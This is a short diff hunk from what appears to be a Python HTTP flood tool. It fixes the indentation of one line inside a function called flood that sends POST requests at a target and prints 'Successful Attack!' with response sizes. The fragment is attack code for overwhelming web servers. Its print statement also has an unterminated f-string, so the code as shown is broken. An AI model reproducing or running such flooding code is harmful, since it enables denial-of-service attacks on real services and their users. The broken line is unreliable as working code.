@@ -101,7 +101,8 @@ def flood(target: str) -> None:
                 response = requests.post(target, headers=headers, timeout=5)
 
             status_color = F.GREEN if response.status_code == 200 else F.RED
-														payload_size = f"{status_color} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
+
+            payload_size = f"{status_color} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
             print(f"{status_color}({response.status_code}) {F.CYAN}{type_request}{F.RESET} Successful Attack! {F.RESET}| Payload Size: {payload_size})
 
         except requests.exceptions.RequestException:
